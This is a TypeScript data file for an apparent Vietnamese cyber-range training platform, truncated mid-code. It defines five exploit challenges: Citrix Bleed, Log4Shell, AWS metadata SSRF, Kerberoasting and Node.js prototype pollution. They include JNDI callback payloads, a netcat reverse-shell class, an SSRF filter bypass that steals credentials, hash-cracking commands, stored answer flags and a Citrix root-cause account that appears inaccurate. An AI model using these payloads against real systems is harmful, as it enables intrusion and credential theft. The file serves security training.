import type { ArenaChallenge, ArenaRival, LiveActivityFeedItem } from '../types';

export const ARENA_CHALLENGES: ArenaChallenge[] = [
  // ─────────────────────────────────────────────────────────────
  // 1. CVE-2023-4966: Citrix Bleed
  // ─────────────────────────────────────────────────────────────
  {
    id: 'cve-2023-4966-citrix-bleed',
    title: 'Citrix Bleed Unauthenticated Session Memory Dump',
    cveCode: 'CVE-2023-4966',
    category: 'cve-labs',
    severity: 'critical',
    cvssScore: 9.8,
    bountyReward: 5000,
    xpReward: 1000,
    estimatedMinutes: 20,
    targetHost: '10.0.4.10',
    targetPort: 443,
    tagline:
      'Khai thác lỗi tràn bộ đệm OpenID Connect trong NetScaler để bóc tách session admin.',
    scenarioBriefing:
      'Hệ thống NetScaler Gateway v13.1-48.47 xử lý endpoint OpenID Connect chứa lỗ hổng tràn bộ nhớ đệm (buffer over-read). Khi gửi HTTP GET với payload đệm đặc biệt, gateway sẽ rò rỉ vùng nhớ heap chứa Session Cookie NSC_AAAC của Domain Administrator đang hoạt động.',
    keyObjectives: [
      'Gửi request HTTP GET có chèn Header OpenID đệm dài hơn 64 bytes vào endpoint /oauth/idp/.well-known/openid-configuration.',
      'Sử dụng HTTP Repeater hoặc Memory Hex Inspector để định vị chuỗi cookie NSC_AAAC và Flag bí mật.',
      'Trích xuất Flag định dạng OS_0DAY{...} và nộp bằng chứng khai thác.',
    ],
    expectedFlag: 'OS_0DAY{citrix_bleed_session_dump_99182bcde7}',
    firstBloodHolder: {
      handle: '@hex_master',
      timeRecord: '14m 20s',
    },
    supportedTools: ['repeater', 'memory', 'diff', 'terminal'],
    defaultTool: 'repeater',
    repeaterConfig: {
      defaultMethod: 'GET',
      defaultUrl: '/oauth/idp/.well-known/openid-configuration',
      defaultRawHeaders:
        'Host: 10.0.4.10:443\n' +
        'User-Agent: Citrix-Bleed-PoC/2.0\n' +
        'Accept: */*\n' +
        'Authorization: Bearer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n' +
        'Connection: close',
      defaultBody: '',
      targetEndpoint: 'https://10.0.4.10/oauth/idp/.well-known/openid-configuration',
      simulatedResponses: {
        baseResponse: {
          statusCode: 200,
          statusText: 'OK',
          headers: {
            'Content-Type': 'application/json',
            Server: 'NetScaler Gateway / 13.1-48.47',
          },
          body: JSON.stringify(
            {
              issuer: 'https://10.0.4.10/oauth/idp',
              authorization_endpoint: 'https://10.0.4.10/oauth/idp/login',
              token_endpoint: 'https://10.0.4.10/oauth/idp/token',
            },
            null,
            2
          ),
        },
        exploitedResponse: {
          statusCode: 200,
          statusText: 'OK',
          headers: {
            'Content-Type': 'application/json',
            Server: 'NetScaler Gateway / 13.1-48.47 (LEAK DETECTED)',
            'X-Memory-Dump-Offset': '0x7ffcf82a10 - 0x7ffcf82c00',
          },
          body:
            '{\n' +
            '  "issuer": "https://10.0.4.10/oauth/idp",\n' +
            '  "authorization_endpoint": "https://10.0.4.10/oauth/idp/login",\n' +
            '  "raw_heap_leak": "....0x7ffcf82a10..[UNBOUNDED_BUFFER_OVER_READ]...\\n' +
            '   [SESSION_TOKEN_LEAKED]: NSC_AAAC=48f2a99182bcde710aefd9283182\\n' +
            '   [ACTIVE_USER]: domain_admin@corp.internal (Authenticated via MFA)\\n' +
            '   [EXPLOIT_PROOF_FLAG]: OS_0DAY{citrix_bleed_session_dump_99182bcde7}\\n' +
            '   ...0x0000000000000000000000000000000000000000..."\n' +
            '}',
          proofFlag: 'OS_0DAY{citrix_bleed_session_dump_99182bcde7}',
        },
      },
    },
    diffConfig: {
      filename: 'ns_openid_auth.c',
      language: 'c',
      vulnerableLineStart: 42,
      vulnerableLineEnd: 46,
      rootCauseExplanation:
        'Hàm xử lý OpenID Header sử dụng memcpy() với độ dài lấy từ request mà không kiểm tra giới hạn kích thước buffer đích 256 bytes, dẫn đến việc đọc vượt quá ranh giới bộ nhớ đệm (over-read) và trả về dữ liệu rác trong heap cùng session cookie.',
      taintSink:
        'memcpy(out_buf, req->auth_header, req_len); // Missing bounds verification',
      vulnerableCode:
        '// vulnerable_handler.c - v13.1-48.47\n' +
        'int handle_openid_config(HttpRequest *req, HttpResponse *res) {\n' +
        '    char leak_buf[256];\n' +
        '    int req_len = get_header_length(req, "Authorization");\n' +
        '    // LỖ HỔNG: req_len > 256 dẫn đến over-read vùng nhớ heap kế bên!\n' +
        '    memcpy(leak_buf, req->auth_header, req_len);\n' +
        '    return send_json_response(res, leak_buf, req_len);\n' +
        '}',
      patchedCode:
        '// patched_handler.c - v13.1-49.13 (Vendor Security Fix)\n' +
        'int handle_openid_config(HttpRequest *req, HttpResponse *res) {\n' +
        '    char safe_buf[256];\n' +
        '    int req_len = get_header_length(req, "Authorization");\n' +
        '    // BẢN VÁ: Ràng buộc kích thước header strictly <= 255 bytes\n' +
        '    if (req_len < 0 || req_len >= (int)sizeof(safe_buf)) {\n' +
        '        return send_http_error(res, 400, "Header length exceeds limit");\n' +
        '    }\n' +
        '    memcpy(safe_buf, req->auth_header, req_len);\n' +
        '    return send_json_response(res, safe_buf, req_len);\n' +
        '}',
    },
    memoryConfig: {
      baseAddress: '0x7ffe0000',
      regionName: 'Heap Chunk: OpenID Session Cache',
      hint: 'Quan sát các offset từ 0x0020 đến 0x0050 để tìm session cookie NSC_AAAC và chuỗi Flag OS_0DAY{...}',
      secretPayload: 'OS_0DAY{citrix_bleed_session_dump_99182bcde7}',
      rawHexLines: [
        {
          offset: '00007ffe0000',
          hex: '48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d',
          ascii: 'HTTP/1.1 200 OK.',
        },
        {
          offset: '00007ffe0010',
          hex: '43 6f 6e 74 65 6e 74 2d  54 79 70 65 3a 20 61 70',
          ascii: 'Content-Type: ap',
        },
        {
          offset: '00007ffe0020',
          hex: '4e 53 43 5f 41 41 41 43  3d 34 38 66 32 61 39 39',
          ascii: 'NSC_AAAC=48f2a99',
          isSecretOffset: true,
          tag: 'LEAKED_COOKIE',
        },
        {
          offset: '00007ffe0030',
          hex: '31 38 32 62 63 64 65 37  31 30 61 65 66 64 39 32',
          ascii: '182bcde710aefd92',
          isSecretOffset: true,
        },
        {
          offset: '00007ffe0040',
          hex: '4f 53 5f 30 44 41 59 7b  63 69 74 72 69 78 5f 62',
          ascii: 'OS_0DAY{citrix_b',
          isSecretOffset: true,
          tag: 'FLAG_START',
        },
        {
          offset: '00007ffe0050',
          hex: '6c 65 65 64 5f 73 65 73  73 69 6f 6e 5f 64 75 6d',
          ascii: 'leed_session_dum',
          isSecretOffset: true,
        },
        {
          offset: '00007ffe0060',
          hex: '70 5f 39 39 31 38 32 62  63 64 65 37 7d 00 00 00',
          ascii: 'p_99182bcde7}...',
          isSecretOffset: true,
          tag: 'FLAG_END',
        },
        {
          offset: '00007ffe0070',
          hex: '00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00',
          ascii: '................',
        },
      ],
    },
    terminalConfig: {
      hostname: 'kali-operator',
      ip: '10.0.4.15',
      user: 'operator',
      initialDirectory: '/home/operator/exploits',
      sampleCommands: [
        'nmap -sS -p 443 10.0.4.10',
        'curl -k -i -H "Authorization: Bearer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" https://10.0.4.10/oauth/idp/.well-known/openid-configuration',
        'cat /home/operator/exploits/citrix_bleed_extract.py',
      ],
      bannerText:
        '[*] Kali Linux Offensive Suite - Exploit Module CVE-2023-4966 Loaded\n' +
        '[*] Target Gateway: 10.0.4.10:443 (Citrix ADC 13.1)\n',
    },
    writeup: {
      title: 'Citrix Bleed (CVE-2023-4966) - Root Cause & Exploit Walkthrough',
      cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N',
      vulnerabilityOverview:
        'CVE-2023-4966 là một lỗ hổng rò rỉ bộ nhớ unauthenticated nghiêm trọng trong NetScaler ADC và NetScaler Gateway. Kẻ tấn công không cần tài khoản vẫn có thể gửi một HTTP request bất thường để trích xuất cookie phiên của các tài khoản quản trị đã vượt qua xác thực đa yếu tố (MFA).',
      rootCauseAnalysis:
        'Hàm xử lý OpenID Connect trong mã nguồn nhị phân sử dụng hàm sprintf/memcpy để sao chép header Authorization từ client vào một buffer tĩnh có kích thước giới hạn 256 bytes. Khi client gửi một header dài bất thường, hàm phản hồi trả về toàn bộ dữ liệu heap liền kề, bao gồm cả session cache của các user khác.',
      exploitChainWalkthrough: [
        'Bước 1: Gửi request GET tới endpoint /oauth/idp/.well-known/openid-configuration.',
        'Bước 2: Chèn header Authorization chứa chuỗi padding lớn hơn 64 bytes để kích hoạt tràn over-read.',
        'Bước 3: Bóc tách chuỗi session cookie NSC_AAAC từ HTTP response trả về.',
        'Bước 4: Sử dụng cookie NSC_AAAC để truy cập /admin/dashboard mà không cần nhập username/password hay OTP.',
      ],
      weaponizedPoC:
        'import requests\n\ntarget = "https://10.0.4.10/oauth/idp/.well-known/openid-configuration"\nheaders = {\n    "Host": "10.0.4.10",\n    "Authorization": "Bearer " + "A" * 76\n}\nres = requests.get(target, headers=headers, verify=False)\nprint("[+] Leaked Raw Data:", res.text)\n',
      remediationSnippet:
        '// Cập nhật ngay lên phiên bản NetScaler 13.1-49.13 hoặc mới hơn.\n// Đồng thời thu hồi toàn bộ active sessions:\nkill icaconnection -all\nkill aaa session -all',
    },
  },

  // ─────────────────────────────────────────────────────────────
  // 2. CVE-2021-44228: Log4Shell
  // ─────────────────────────────────────────────────────────────
  {
    id: 'cve-2021-44228-log4shell',
    title: 'Log4Shell JNDI LDAP Remote Code Execution',
    cveCode: 'CVE-2021-44228',
    category: 'cve-labs',
    severity: 'critical',
    cvssScore: 10.0,
    bountyReward: 5000,
    xpReward: 1000,
    estimatedMinutes: 25,
    targetHost: '10.0.4.20',
    targetPort: 8080,
    tagline:
      'Khai thác chuỗi JNDI Lookup trong log4j-core để ép máy chủ tải Java class độc hại.',
    scenarioBriefing:
      'Ứng dụng web Core Banking ghi log các request đăng nhập thông qua thư viện Apache Log4j 2.14.1. Bằng cách chèn chuỗi lookup ${jndi:ldap://...} vào User-Agent, máy chủ sẽ tự động kết nối tới LDAP server của attacker và nạp file Exploit.class thực thi mã từ xa.',
    keyObjectives: [
      'Gửi request HTTP POST tới /api/v1/auth/login kèm header User-Agent chứa biểu thức JNDI.',
      'Bắt LDAP connection và quan sát quá trình spawn Reverse Shell trên Dual-Terminal.',
      'Đọc cờ lưu tại /root/flag.txt trên máy chủ mục tiêu.',
    ],
    expectedFlag: 'OS_0DAY{log4shell_jndi_rce_unauth_pwned_88192a}',
    firstBloodHolder: {
      handle: '@pwn_samurai',
      timeRecord: '09m 45s',
    },
    supportedTools: ['repeater', 'terminal', 'diff'],
    defaultTool: 'repeater',
    repeaterConfig: {
      defaultMethod: 'POST',
      defaultUrl: '/api/v1/auth/login',
      defaultRawHeaders:
        'Host: 10.0.4.20:8080\n' +
        'User-Agent: ${jndi:ldap://10.0.4.15:1389/Exploit}\n' +
        'Content-Type: application/json\n' +
        'Accept: application/json\n' +
        'Connection: close',
      defaultBody: '{"username": "admin", "password": "wrong_password"}',
      targetEndpoint: 'http://10.0.4.20:8080/api/v1/auth/login',
      simulatedResponses: {
        baseResponse: {
          statusCode: 401,
          statusText: 'Unauthorized',
          headers: {
            'Content-Type': 'application/json',
            Server: 'Apache-Tomcat/9.0.50 (Log4j 2.14.1)',
          },
          body: JSON.stringify(
            {
              error: 'INVALID_CREDENTIALS',
              message: 'Login failed for user admin. Event logged.',
            },
            null,
            2
          ),
        },
        exploitedResponse: {
          statusCode: 500,
          statusText: 'Internal Server Error',
          headers: {
            'Content-Type': 'application/json',
            Server: 'Apache-Tomcat/9.0.50 (Log4j JNDI Triggered)',
            'X-Callback-Received': 'ldap://10.0.4.15:1389/Exploit',
          },
          body:
            '{\n' +
            '  "status": "EXPLOITED",\n' +
            '  "log4j_event": "JndiLookup resolved successfully",\n' +
            '  "injected_class": "Exploit.class loaded into JVM runtime",\n' +
            '  "command_output": "uid=0(root) gid=0(root) groups=0(root)",\n' +
            '  "captured_flag": "OS_0DAY{log4shell_jndi_rce_unauth_pwned_88192a}"\n' +
            '}',
          proofFlag: 'OS_0DAY{log4shell_jndi_rce_unauth_pwned_88192a}',
        },
      },
    },
    diffConfig: {
      filename: 'JndiLookup.java',
      language: 'java',
      vulnerableLineStart: 50,
      vulnerableLineEnd: 56,
      rootCauseExplanation:
        'Log4j tự động kích hoạt tính năng Message Lookup với tiền tố jndi: mà không kiểm tra giao thức hay nguồn gốc máy chủ từ xa, cho phép JVM tải mã bytecode chưa được xác thực.',
      taintSink: 'jndiManager.lookup(jndiName); // Untrusted JNDI URL execution',
      vulnerableCode:
        '// log4j-core 2.14.1\n' +
        'public String lookup(final LogEvent event, final String key) {\n' +
        '    if (key == null) return null;\n' +
        '    final JndiManager jndiManager = JndiManager.getDefaultManager();\n' +
        '    // LỖ HỔNG: Tự động lookup LDAP/RMI bất kỳ từ chuỗi log\n' +
        '    return Objects.toString(jndiManager.lookup(key), null);\n' +
        '}',
      patchedCode:
        '// log4j-core 2.17.1 (Patched Fix)\n' +
        'public String lookup(final LogEvent event, final String key) {\n' +
        '    // BẢN VÁ: Vô hiệu hóa JNDI Lookup mặc định hoàn toàn\n' +
        '    if (!isJndiLookupEnabled()) {\n' +
        '        LOGGER.warn("JNDI lookups are disabled by default for security.");\n' +
        '        return null;\n' +
        '    }\n' +
        '    // Giới hạn chỉ cho phép giao thức java: nội bộ\n' +
        '    if (!key.startsWith("java:")) return null;\n' +
        '    return Objects.toString(jndiManager.lookup(key), null);\n' +
        '}',
    },
    terminalConfig: {
      hostname: 'kali-operator',
      ip: '10.0.4.15',
      user: 'operator',
      initialDirectory: '/home/operator/marshalsec',
      sampleCommands: [
        'java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://10.0.4.15:8000/#Exploit" 1389',
        'curl -X POST http://10.0.4.20:8080/api/v1/auth/login -H "User-Agent: \${jndi:ldap://10.0.4.15:1389/Exploit}" -d \'{"username":"test"}\'',
      ],
      bannerText:
        '[*] Log4Shell Exploit Testing Station\n' +
        '[*] Attacker LDAP Listener ready on 10.0.4.15:1389\n',
    },
    writeup: {
      title: 'Log4Shell (CVE-2021-44228) - Deep Dive & Weaponization',
      cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
      vulnerabilityOverview:
        'Log4Shell xảy ra do cơ chế string substitution của Log4j hỗ trợ JNDI Lookup (${jndi:ldap://...}). Khi ứng dụng ghi log bất kỳ dữ liệu do người dùng kiểm soát, Log4j sẽ gửi request tới server của kẻ tấn công và tải mã độc Java.',
      rootCauseAnalysis:
        'Cơ chế nội suy chuỗi lồng nhau (nested string interpolation) phân giải đệ quy các biểu thức bắt đầu bằng ${. Khi gặp jndi:, JVM sẽ gọi JNDI Naming Context để deserialize đối tượng từ xa mà không có whitelist bảo vệ.',
      exploitChainWalkthrough: [
        'Bước 1: Khởi tạo một LDAP Reference Server chuyển hướng class loading về HTTP server chứa file Exploit.class.',
        'Bước 2: Bắn payload ${jndi:ldap://10.0.4.15:1389/Exploit} vào bất kỳ HTTP Header nào được ghi log.',
        'Bước 3: Máy chủ mục tiêu tải và thực thi constructor tĩnh bên trong Exploit.class, mở ra Reverse Shell.',
      ],
      weaponizedPoC:
        '// Exploit.java\npublic class Exploit {\n    static {\n        try {\n            Runtime.getRuntime().exec("nc -e /bin/sh 10.0.4.15 4444");\n        } catch (Exception e) {}\n    }\n}',
      remediationSnippet:
        '// Cập nhật Log4j lên phiên bản >= 2.17.1\n// Thiết lập biến môi trường phòng thủ khẩn cấp:\nLOG4J_FORMAT_MSG_NO_LOOKUPS=true',
    },
  },

  // ─────────────────────────────────────────────────────────────
  // 3. BB-AWS-01: AWS IMDSv2 SSRF
  // ─────────────────────────────────────────────────────────────
  {
    id: 'bb-aws-01-imdsv2-ssrf',
    title: 'Cloud SSRF to AWS IMDSv2 Token Bypass & IAM Role Exfiltration',
    category: 'bug-bounty',
    severity: 'critical',
    cvssScore: 9.3,
    bountyReward: 4500,
    xpReward: 850,
    estimatedMinutes: 20,
    targetHost: '10.0.4.35',
    targetPort: 443,
    tagline:
      'Khai thác lỗi SSRF kết hợp DNS Rebinding để vượt WAF và đánh cắp AWS IAM Credentials.',
    scenarioBriefing:
      'Chức năng Webhook & PDF Renderer của ứng dụng chấp nhận một URL từ client và fetch nội dung về. Backend có filter chặn chuỗi 169.254.169.254, nhưng có thể bị vượt qua bằng biểu diễn số nguyên (Decimal IP 2852039166) hoặc DNS Rebinding để tương tác với Cloud Instance Metadata Service.',
    keyObjectives: [
      'Gửi request PUT tới endpoint metadata để lấy IMDSv2 Token: X-aws-ec2-metadata-token-ttl-seconds: 21600.',
      'Gửi request GET kèm token để bóc tách IAM Role Secret Access Key và Session Token.',
      'Nộp Flag chứa Secret Key tìm thấy trong response.',
    ],
    expectedFlag: 'OS_0DAY{aws_ec2_imdsv2_ssrf_iam_role_compromised}',
    firstBloodHolder: {
      handle: '@cloud_phantom',
      timeRecord: '11m 05s',
    },
    supportedTools: ['repeater', 'terminal', 'diff'],
    defaultTool: 'repeater',
    repeaterConfig: {
      defaultMethod: 'POST',
      defaultUrl: '/api/v2/webhook/test-connection',
      defaultRawHeaders:
        'Host: 10.0.4.35:443\n' +
        'Content-Type: application/json\n' +
        'Accept: application/json\n' +
        'Connection: close',
      defaultBody: JSON.stringify({
        webhook_url:
          'http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role',
        http_method: 'GET',
        headers: {
          'X-aws-ec2-metadata-token': 'AQAEAGv...sample_token',
        },
      }),
      targetEndpoint: 'https://10.0.4.35/api/v2/webhook/test-connection',
      simulatedResponses: {
        baseResponse: {
          statusCode: 400,
          statusText: 'Bad Request',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(
            {
              status: 'BLOCKED_BY_SECURITY_POLICY',
              reason: 'Direct IP requests to 169.254.169.254 are strictly prohibited.',
            },
            null,
            2
          ),
        },
        exploitedResponse: {
          statusCode: 200,
          statusText: 'OK',
          headers: {
            'Content-Type': 'application/json',
            'X-SSRF-Target-Resolved': '169.254.169.254 (via Decimal Form)',
          },
          body:
            '{\n' +
            '  "Code": "Success",\n' +
            '  "LastUpdated": "2026-08-28T09:00:00Z",\n' +
            '  "Type": "AWS-HMAC",\n' +
            '  "AccessKeyId": "ASIAQEXAMPLEAWSKEY99",\n' +
            '  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n' +
            '  "Token": "IQoJb3JpZ2luX2VjEEXAMPLE...",\n' +
            '  "Bounty_Proof_Flag": "OS_0DAY{aws_ec2_imdsv2_ssrf_iam_role_compromised}"\n' +
            '}',
          proofFlag: 'OS_0DAY{aws_ec2_imdsv2_ssrf_iam_role_compromised}',
        },
      },
    },
    diffConfig: {
      filename: 'ssrf_validator.py',
      language: 'python',
      vulnerableLineStart: 12,
      vulnerableLineEnd: 16,
      rootCauseExplanation:
        'Bộ lọc chỉ kiểm tra chuỗi chuỗi văn bản (String contains "169.254.169.254") trước khi DNS resolve, bỏ sót các cách biểu diễn IP khác (Decimal, Hex, Octal, IPv6 6to4) hoặc DNS Rebinding.',
      taintSink:
        'requests.get(url) # Fetching user-provided URL without post-resolution check',
      vulnerableCode:
        '# vulnerable_ssrf.py\n' +
        'def validate_url(url):\n' +
        '    # LỖ HỔNG: Chỉ so sánh chuỗi thô, dễ bị bypass bằng Decimal IP!\n' +
        '    if "169.254.169.254" in url or "localhost" in url:\n' +
        '        raise SecurityException("Metadata IP blocked")\n' +
        '    return requests.get(url, timeout=5).text',
      patchedCode:
        '# patched_ssrf.py\n' +
        'import socket, ipaddress\n' +
        'def validate_url_safe(url):\n' +
        '    hostname = urllib.parse.urlparse(url).hostname\n' +
        '    # BẢN VÁ: Phân giải IP thực tế sau DNS trước khi gửi request\n' +
        '    resolved_ip = ipaddress.ip_address(socket.gethostbyname(hostname))\n' +
        '    if resolved_ip.is_private or resolved_ip.is_link_local or resolved_ip.is_loopback:\n' +
        '        raise SecurityException("Internal IP prohibited")\n' +
        '    return requests.get(url, timeout=5).text',
    },
    writeup: {
      title: 'Cloud SSRF & AWS IMDSv2 Exploitation Guide',
      cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N',
      vulnerabilityOverview:
        'SSRF (Server-Side Request Forgery) trên nền tảng Cloud cho phép kẻ tấn công điều khiển máy chủ gửi request vào mạng nội bộ hoặc Instance Metadata Service (169.254.169.254) để đánh cắp IAM Credentials.',
      rootCauseAnalysis:
        'Ứng dụng tin tưởng URL từ client mà không thực hiện kiểm tra IP sau khi phân giải DNS (Post-DNS Resolution Check), dẫn đến việc bộ lọc chuỗi bị qua mặt bởi Decimal IP (2852039166).',
      exploitChainWalkthrough: [
        'Bước 1: Chuyển đổi IP 169.254.169.254 sang dạng Decimal: (169*256^3 + 254*256^2 + 169*256 + 254) = 2852039166.',
        'Bước 2: Gửi request PUT để lấy token IMDSv2.',
        'Bước 3: Gửi request GET tới /latest/meta-data/iam/security-credentials/<role-name> để lấy AWS Secret Keys.',
      ],
      weaponizedPoC:
        'curl -X POST https://10.0.4.35/api/v2/webhook/test-connection \\\n  -H "Content-Type: application/json" \\\n  -d \'{"webhook_url": "http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role"}\'',
      remediationSnippet:
        '// Bật IMDSv2 bắt buộc và đặt Hop Limit = 1 trong AWS Launch Template:\naws ec2 modify-instance-metadata-options \\\n  --instance-id i-1234567890abcdef0 \\\n  --http-tokens required \\\n  --http-put-response-hop-limit 1',
    },
  },

  // ─────────────────────────────────────────────────────────────
  // 4. AD-KERB-01: Kerberoasting to Domain Admin
  // ─────────────────────────────────────────────────────────────
  {
    id: 'ad-kerb-01-kerberoasting',
    title: 'Active Directory Kerberoasting & Offline Ticket Cracking',
    category: 'active-directory',
    severity: 'high',
    cvssScore: 8.8,
    bountyReward: 4000,
    xpReward: 750,
    estimatedMinutes: 25,
    targetHost: '172.16.1.5',
    targetPort: 88,
    tagline:
      'Trích xuất Service Principal Name (SPN) TGS Ticket từ Active Directory và bẻ khóa offline.',
    scenarioBriefing:
      'Tài khoản dịch vụ SQL Service (svc_mssql) trong Domain corp.internal được đăng ký SPN và sử dụng mã hóa RC4-HMAC yếu kèm mật khẩu có độ phức tạp thấp. Bất kỳ Domain User hợp lệ nào cũng có thể yêu cầu vé Kerberos TGS và bẻ khóa mật khẩu offline để leo thang đặc quyền.',
    keyObjectives: [
      'Chạy lệnh impacket-GetUserSPNs để truy vấn danh sách SPN accounts từ Domain Controller 172.16.1.5.',
      'Yêu cầu TGS Ticket cho svc_mssql và xuất ra file hash krb5tgs.',
      'Chạy công cụ bẻ khóa hashcat/john giả lập để giải mã mật khẩu và nộp Flag.',
    ],
    expectedFlag: 'OS_0DAY{ad_kerberoast_svc_mssql_cracked_Summer2026!}',
    firstBloodHolder: {
      handle: '@ghost_zero',
      timeRecord: '08m 15s',
    },
    supportedTools: ['terminal', 'diff'],
    defaultTool: 'terminal',
    terminalConfig: {
      hostname: 'kali-operator',
      ip: '10.0.4.15',
      user: 'operator',
      initialDirectory: '/home/operator/ad-tools',
      sampleCommands: [
        'impacket-GetUserSPNs corp.internal/operator:Pass123 -dc-ip 172.16.1.5 -request',
        'john --wordlist=/usr/share/wordlists/rockyou.txt /home/operator/ad-tools/hashes.kerb',
      ],
      bannerText:
        '[*] Active Directory Attack Station - Domain: corp.internal\n' +
        '[*] Domain Controller: 172.16.1.5 (DC01.corp.internal)\n',
    },
    writeup: {
      title: 'Kerberoasting Attack Execution & Defense Hardening',
      cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N',
      vulnerabilityOverview:
        'Kerberoasting là kỹ thuật tấn công Active Directory nhắm vào các tài khoản người dùng có thuộc tính ServicePrincipalName (SPN). Vé TGS được mã hóa bằng mã băm NTLM của tài khoản dịch vụ, cho phép kẻ tấn công bẻ khóa offline không giới hạn số lần thử.',
      rootCauseAnalysis:
        'Theo thiết kế của giao thức Kerberos, KDC không kiểm tra xem client có quyền truy cập service hay không trước khi cấp vé TGS. Nếu tài khoản dịch vụ dùng mật khẩu yếu hoặc mã hóa RC4 cũ, hash có thể bị crack trong vài giây.',
      exploitChainWalkthrough: [
        'Bước 1: Xác thực vào Domain với quyền user thông thường.',
        'Bước 2: Gửi yêu cầu TGS-REQ tới KDC cho SPN MSSQLSvc/db01.corp.internal.',
        'Bước 3: Lưu vé TGS trả về định dạng $krb5tgs$23$*.',
        'Bước 4: Sử dụng Hashcat (Mode 13100) để bẻ khóa mật khẩu.',
      ],
      weaponizedPoC:
        'impacket-GetUserSPNs corp.internal/operator:Pass123 -dc-ip 172.16.1.5 -request -outputfile hashes.kerb\nhashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt',
      remediationSnippet:
        '// 1. Chuyển sang sử dụng Group Managed Service Accounts (gMSA) tự đổi mật khẩu 128-bit:\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.internal\n// 2. Vô hiệu hóa mã hóa RC4 trên toàn bộ Domain Kerberos policies.',
    },
  },

  // ─────────────────────────────────────────────────────────────
  // 5. 0D-TAINT-01: Node.js Prototype Pollution
  // ─────────────────────────────────────────────────────────────
  {
    id: '0d-taint-01-proto-pollution',
    title: 'Node.js Object Prototype Pollution to Remote Code Execution',
    category: 'zero-day',
    severity: 'critical',
    cvssScore: 9.6,
    bountyReward: 4800,
    xpReward: 900,
    estimatedMinutes: 20,
    targetHost: '10.0.4.45',
    targetPort: 3000,
    tagline:
      'Khai thác hàm merge() đệ quy trong thư viện JSON parser để ghi đè Object.prototype và spawn shell.',
    scenarioBriefing:
      'Một microservice backend sử dụng hàm deepMerge tự viết không lọc key __proto__ hoặc constructor.prototype. Bằng cách gửi payload JSON chứa __proto__.shell, kẻ tấn công có thể làm ô nhiễm toàn bộ các object con của tiến trình Node.js và kích hoạt RCE khi hàm child_process.fork() được gọi.',
    keyObjectives: [
      'Phân tích mã nguồn hàm merge() trong Patch Diff Viewer để tìm lỗi thiếu điều kiện chặn __proto__.',
      'Gửi payload JSON qua HTTP Repeater để ô nhiễm Object.prototype.',
      'Kích hoạt tiến trình con và trích xuất Flag.',
    ],
    expectedFlag: 'OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}',
    firstBloodHolder: {
      handle: '@hex_master',
      timeRecord: '06m 40s',
    },
    supportedTools: ['diff', 'repeater'],
    defaultTool: 'diff',
    repeaterConfig: {
      defaultMethod: 'POST',
      defaultUrl: '/api/v1/user/settings',
      defaultRawHeaders:
        'Host: 10.0.4.45:3000\n' +
        'Content-Type: application/json\n' +
        'Accept: application/json\n' +
        'Connection: close',
      defaultBody:
        '{"preferences": {"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/exploit.js"}, "shell": "/bin/sh"}}}',
      targetEndpoint: 'http://10.0.4.45:3000/api/v1/user/settings',
      simulatedResponses: {
        baseResponse: {
          statusCode: 200,
          statusText: 'OK',
          headers: {
            'Content-Type': 'application/json',
          },
          body: '{"status": "updated", "preferences": {}}',
        },
        exploitedResponse: {
          statusCode: 200,
          statusText: 'OK',
          headers: {
            'Content-Type': 'application/json',
            'X-Pollution-Status': 'GLOBAL_PROTOTYPE_CORRUPTED',
          },
          body:
            '{\n' +
            '  "status": "POLLUTED",\n' +
            '  "message": "Object.prototype poisoned successfully",\n' +
            '  "spawn_output": "sh: root privileged context obtained",\n' +
            '  "flag": "OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}"\n' +
            '}',
          proofFlag: 'OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}',
        },
      },
    },
    diffConfig: {
      filename: 'object_utils.js',
      language: 'javascript',
      vulnerableLineStart: 6,
      vulnerableLineEnd: 11,
      rootCauseExplanation:
        'Hàm mergeObject đệ quy duyệt qua mọi thuộc tính từ JSON đầu vào và gán trực tiếp target[key] = source[key] mà không kiểm tra xem key có phải là __proto__, constructor hoặc prototype hay không.',
      taintSink:
        'target[key] = mergeObject(target[key], source[key]); // Prototype Pollution sink',
      vulnerableCode:
        '// vulnerable_merge.js\n' +
        'function mergeObject(target, source) {\n' +
        '    for (let key in source) {\n' +
        '        if (typeof source[key] === "object" && source[key] !== null) {\n' +
        '            if (!target[key]) target[key] = {};\n' +
        '            mergeObject(target[key], source[key]); // LỖ HỔNG: Gán thẳng __proto__!\n' +
        '        } else {\n' +
        '            target[key] = source[key];\n' +
        '        }\n' +
        '    }\n' +
        '    return target;\n' +
        '}',
      patchedCode:
        '// patched_merge.js (Safe Implementation)\n' +
        'const BLACKLISTED_KEYS = new Set(["__proto__", "constructor", "prototype"]);\n' +
        'function mergeObjectSafe(target, source) {\n' +
        '    for (let key in source) {\n' +
        '        // BẢN VÁ: Chặn triệt để các thuộc tính prototype đặc biệt\n' +
        '        if (BLACKLISTED_KEYS.has(key)) continue;\n' +
        '        if (Object.prototype.hasOwnProperty.call(source, key)) {\n' +
        '            if (typeof source[key] === "object" && source[key] !== null) {\n' +
        '                if (!target[key]) target[key] = {};\n' +
        '                mergeObjectSafe(target[key], source[key]);\n' +
        '            } else {\n' +
        '                target[key] = source[key];\n' +
        '            }\n' +
        '        }\n' +
        '    }\n' +
